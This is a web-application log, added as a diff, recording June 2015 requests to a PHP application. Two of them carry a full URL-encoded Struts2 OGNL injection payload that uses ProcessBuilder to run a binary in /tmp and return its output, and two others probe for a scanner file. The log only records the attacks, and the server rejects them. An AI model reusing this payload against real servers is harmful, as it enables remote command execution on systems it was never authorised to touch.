@@ -1,0 +1,24 @@
+[ 2015-06-21T03:15:34+08:00 ] 61.160.213.108 /loginAction.action?redirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22nohup%22%2C%22%2Ftmp%2Fchunassh%3E%22%2C%22%2Fdev%2Fnull%22%2C%222%3E%261%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+ERR: 无法加载模块:LoginAction
+
+[ 2015-06-21T03:15:38+08:00 ] 61.160.213.108 /index.action?redirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22nohup%22%2C%22%2Ftmp%2Fchunassh%3E%22%2C%22%2Fdev%2Fnull%22%2C%222%3E%261%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()}
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000096s ]
+ERR: 无法加载模块:Index
+
+[ 2015-06-21T16:59:46+08:00 ] 121.42.0.38 /webscan38502863.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
+ERR: 无法加载模块:Webscan38502863
+
+[ 2015-06-21T17:00:04+08:00 ] 121.42.0.38 /webscan38502863.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
+ERR: 无法加载模块:Webscan38502863
+
